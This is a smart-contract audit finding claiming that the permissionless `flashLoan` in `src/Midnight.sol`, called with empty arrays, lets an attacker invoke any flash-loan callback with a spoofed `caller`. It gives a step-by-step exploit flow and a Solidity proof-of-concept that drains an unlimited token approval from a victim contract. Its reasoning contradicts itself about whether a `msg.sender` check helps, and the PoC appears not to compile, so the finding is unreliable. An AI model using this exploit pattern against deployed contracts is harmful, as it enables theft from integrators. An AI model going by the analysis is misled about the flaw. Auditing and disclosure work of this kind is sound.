### Title
Permissionless `flashLoan` with empty token arrays lets attacker invoke any `IFlashLoanCallback` with attacker-controlled `caller` - (`src/Midnight.sol`)

### Summary
`Midnight.flashLoan` is fully permissionless and accepts an arbitrary `callback` address, passing `msg.sender` (the attacker) as the `caller` argument to `onFlashLoan`. Because there is no minimum token-array-length requirement, an attacker can call `flashLoan([], [], victimCallback, data)` with zero tokens, bypassing all token-balance preconditions and causing `victimCallback.onFlashLoan(attacker, [], [], data)` to execute with the attacker as `caller`. Any periphery contract that implements `IFlashLoanCallback` without validating `msg.sender == MIDNIGHT` will process this call as if it were a legitimate flash loan initiated by the attacker.

### Finding Description
**Code path:**

`src/Midnight.sol:737-752` — `flashLoan`:

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput()); // passes for ([], [])
    emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
    for (uint256 i = 0; i < tokens.length; i++) {          // skipped: length == 0
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()
    );
    for (uint256 i = 0; i < tokens.length; i++) {          // skipped: length == 0
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    }
}
```

**Root cause:** Three independent design properties combine:
1. `flashLoan` has no access control — any EOA or contract can call it.
2. The `callback` parameter is fully attacker-supplied — Midnight will call `onFlashLoan` on any address.
3. There is no `require(tokens.length > 0)` guard — empty arrays satisfy `tokens.length == assets.length`, both transfer loops are skipped, and the callback is still invoked. No token balance in Midnight is required.

**Attacker inputs:**
- `tokens = []`, `assets = []` (empty arrays, zero preconditions)
- `callback = address(victimContract)` (any deployed `IFlashLoanCallback` implementor)
- `data = <arbitrary attacker-chosen bytes>`

**Exploit flow:**
1. Attacker deploys or identifies a victim periphery contract that implements `IFlashLoanCallback.onFlashLoan` and uses the `caller` argument for access-control decisions (e.g., `token.approve(caller, amount)`) without first checking `msg.sender == MIDNIGHT`.
2. Attacker calls `midnight.flashLoan([], [], victimContract, maliciousData)`.
3. Midnight emits `FlashLoan(attacker, [], [], victimContract)` and immediately calls `victimContract.onFlashLoan(attacker, [], [], maliciousData)`.
4. Inside `onFlashLoan`, `msg.sender == address(midnight)` (passes any `msg.sender` guard), but `caller == attacker`.
5. Victim executes its logic under the false belief that `caller` is a trusted initiator — e.g., grants a token approval to `attacker`, updates internal accounting in attacker's favour, or releases funds.
6. Midnight's post-callback `safeTransferFrom` loop is also skipped (empty arrays), so the call succeeds and returns normally.

**Why existing checks fail:** The only check in `flashLoan` is `tokens.length == assets.length`. There is no restriction on who may call `flashLoan`, no restriction on which address may be supplied as `callback`, and no minimum array length. The `IFlashLoanCallback` interface (`src/interfaces/ICallbacks.sol:24-26`) carries no NatSpec warning that implementors must validate `msg.sender`. The Certora spec (`certora/specs/BalanceEffects.spec:27`) models `onFlashLoan` as `NONDET`, confirming no protocol-level invariant prevents this invocation path. [1](#0-0) [2](#0-1) 

### Impact Explanation
A victim periphery contract that implements `IFlashLoanCallback` and acts on the `caller` argument (e.g., grants a token approval, records a privileged state, or releases escrowed funds keyed to the initiator) will execute that logic with the attacker as `caller`. Because `msg.sender` inside the callback is the legitimate Midnight address, any `msg.sender == MIDNIGHT` guard the victim has is satisfied, making the call indistinguishable from a real flash loan at the `msg.sender` level. The concrete result is that the attacker can obtain token approvals, trigger state changes, or extract value from the victim contract without ever having initiated a legitimate flash loan.

### Likelihood Explanation
- **Preconditions:** None on Midnight's state. No tokens need to be held by Midnight. No prior interaction with the protocol is required.
- **Feasibility:** A single transaction from any EOA suffices. The attacker only needs to know the victim contract's address.
- **Repeatability:** The attack can be repeated arbitrarily; there is no nonce, consumed-amount, or rate-limit mechanism on `flashLoan`.
- **Realistic victim surface:** Any periphery contract (router, vault, aggregator) that integrates flash loans and uses `caller` for routing, approvals, or accounting without a secondary `msg.sender` check is vulnerable. The `IFlashLoanCallback` interface provides no documentation warning against this pattern.

### Recommendation
**In `IFlashLoanCallback` / integration documentation:** Add explicit NatSpec requiring implementors to validate `msg.sender == MIDNIGHT` before processing any `caller`-dependent logic. Even with that check, document that `caller` is untrusted and must not be used for privileged decisions without additional application-level validation.

**In `Midnight.flashLoan`:** Consider adding `require(tokens.length > 0, EmptyFlashLoan())` to eliminate the zero-cost invocation path that requires no token balance. This raises the cost of the attack (attacker must ensure Midnight holds the requested tokens) without breaking legitimate use cases.

**In periphery contracts:** Implement the two-layer guard:
```solidity
function onFlashLoan(address caller, address[] memory tokens, uint256[] memory assets, bytes memory data)
    external returns (bytes32)
{
    require(msg.sender == MIDNIGHT, "unauthorized");
    require(caller == trustedInitiator, "untrusted caller"); // if caller is used for access control
    ...
}
```

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IMidnight} from "src/interfaces/IMidnight.sol";
import {ERC20} from "test/erc20s/ERC20.sol";

/// Victim: grants token approval to whoever `caller` is, without checking msg.sender.
contract VulnerableCallback is IFlashLoanCallback {
    ERC20 public token;
    constructor(ERC20 _token) { token = _token; }

    function onFlashLoan(address caller, address[] memory, uint256[] memory, bytes memory)
        external returns (bytes32)
    {
        // BUG: no require(msg.sender == MIDNIGHT)
        // Uses caller for privileged action:
        token.approve(caller, type(uint256).max);
        return CALLBACK_SUCCESS;
    }
}

contract AttackerTest {
    function testAttack(IMidnight midnight, ERC20 token) external {
        VulnerableCallback victim = new VulnerableCallback(token);

        address[] memory tokens = new address[](0);
        uint256[] memory assets = new uint256[](0);

        // Attacker calls flashLoan with empty arrays — no token balance required in Midnight.
        midnight.flashLoan(tokens, assets, address(victim), "");

        // Assert: victim granted unlimited approval to attacker (address(this)).
        assertEq(token.allowance(address(victim), address(this)), type(uint256).max);
    }
}
```

**Expected assertions:**
- `token.allowance(address(victim), attacker) == type(uint256).max` — approval granted to attacker.
- The `flashLoan` call does not revert.
- No tokens were held by or transferred from Midnight. [3](#0-2) [4](#0-3)

### Citations

**File:** src/Midnight.sol (L737-752)
```text
    function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
        external
    {
        require(tokens.length == assets.length, InconsistentInput());
        emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
        }
        require(
            IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
            WrongFlashLoanCallbackReturnValue()
        );
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
        }
    }
```

**File:** src/interfaces/ICallbacks.sol (L24-26)
```text
interface IFlashLoanCallback {
    function onFlashLoan(address caller, address[] memory tokens, uint256[] memory assets, bytes memory data) external returns (bytes32);
}
```

**File:** test/FlashloanTest.sol (L38-49)
```text
        vm.prank(caller);
        midnight.flashLoan(tokens, amounts, address(this), data);

        assertEq(recordedTokens.length, tokens.length, "recorded tokens length");
        assertEq(recordedAmounts.length, amounts.length, "recorded amounts length");
        for (uint256 i = 0; i < tokens.length; i++) {
            assertEq(recordedTokens[i], tokens[i], "recorded token");
            assertEq(recordedAmounts[i], amounts[i], "recorded amount");
            assertEq(ERC20(tokens[i]).balanceOf(address(this)), 0, "balanceOf(this)");
            assertEq(ERC20(tokens[i]).balanceOf(address(midnight)), amounts[i], "balanceOf(midnight)");
        }
        assertEq(recordedCaller, caller, "recorded caller");
```
